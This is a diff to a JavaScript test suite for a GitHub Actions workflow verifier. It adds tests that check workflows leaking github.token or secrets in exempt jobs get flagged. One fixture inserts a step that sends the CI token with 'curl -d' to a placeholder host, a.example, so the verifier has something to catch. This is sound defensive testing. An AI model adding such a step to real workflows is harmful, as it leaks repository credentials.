@@ -24,14 +24,11 @@ import {
   commandName,
   SETTINGS,
   WORKFLOWS,
-  findings,
-  publicGateFindings,
+  allFindings,
   readScriptOutputs,
   referenceFindings,
   surfaceFindings,
-  writePermissionFindings,
-  continueOnErrorFindings,
-  releaseGateFindings,
+  exemptTokenFindings,
   verifyWorkflows,
 } from "./verify-workflows.mjs";
 import { lexStrict } from "./strict-shell.mjs";
@@ -48,15 +45,9 @@ const SCRIPTS = readScriptOutputs(ROOT);
 const C = "cli-release.yml";
 
 const all = (w) =>
-  [
-    ...findings({ settings, manifest, workflows: w }),
-    ...publicGateFindings(w),
-    ...releaseGateFindings(w),
-    ...referenceFindings(w, SCRIPTS, settings),
-    ...surfaceFindings(w),
-    ...writePermissionFindings(w),
-    ...continueOnErrorFindings(w),
-  ].map((f) => `${f.file}: ${f.job}: ${f.why}`);
+  allFindings({ settings, manifest, workflows: w, scriptOutputs: SCRIPTS }).map(
+    (f) => `${f.file}: ${f.job}: ${f.why}`,
+  );
 /** The findings `mutate` adds to the real tree, which itself has none. */
 function added(mutate) {
   const w = structuredClone(BASE);
@@ -2013,5 +2004,72 @@ describe("every CLI job that publishes re-checks the tag is on main (round 10, M
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
     ).toBe(true);
+  });
+});
+
+describe("the write-token exemption skips rules 3 and 15 only (round 10, MED-2)", () => {
+  const G = "release-gate.yml";
+  const T = (w) => w[G].jobs.test;
+  const EXEMPT = /names github\.token or secrets in a WRITE_TOKEN_EXEMPT job \(/;
+  const EXEMPT_WF = /names github\.token or secrets in a WRITE_TOKEN_EXEMPT job's workflow/;
+  it.each(
+    ROWS.rows([
+      [
+        "E1 test: a step env from github.token, sent by curl",
+        (w) =>
+          void T(w).steps.splice(1, 0, {
+            name: "x",
+            env: { T: "${{ github.token }}" },
+            run: 'curl -d "$T" https://a.example\n',
+          }),
+        EXEMPT,
+      ],
+      [
+        "E1b test: github.token in the dagger step's with:",
+        (w) =>
+          void (T(w).steps.find((s) => String(s.uses).startsWith("dagger/")).with.args =
+            "x --token=${{ github.token }}"),
+        EXEMPT,
+      ],
+      [
+        "E1c test: an upper-case GITHUB.TOKEN in a step env",
+        (w) => void (T(w).steps[1].env = { T: "${{ GITHUB.TOKEN }}" }),
+        EXEMPT,
+      ],
+      [
+        "E4 test: a project script on the host before github-script",
+        (w) => void T(w).steps.splice(1, 0, { name: "x", run: "bash scripts/prepare.sh\n" }),
+        /test: runs \d+ actions, ACTION_SURFACE records \d+/,
+      ],
+      [
+        "E8 test: a job env from github.token",
+        (w) => void (T(w).env = { GH: "${{ github.token }}" }),
+        EXEMPT,
+      ],
+      [
+        "E8b test: a job env from a secret",
+        (w) => void (T(w).env = { GH: "${{ secrets.FOO }}" }),
+        EXEMPT,
+      ],
+      [
+        "E9 release-gate: a workflow env from github.token",
+        (w) => void (w[G].env = { GH: "${{ github.token }}" }),
+        EXEMPT_WF,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
+    const got = added(mutate);
+    expectFindings(label, got);
+    expect(
+      got.some((g) => why.test(g)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
+  });
+  it("refuses an exemption for a job the workflow no longer has", () => {
+    const w = structuredClone(BASE);
+    delete w[G].jobs.test;
+    expect(exemptTokenFindings(w).map((f) => f.why)).toContain(
+      "WRITE_TOKEN_EXEMPT records a job the workflow does not have",
+    );
   });
 });
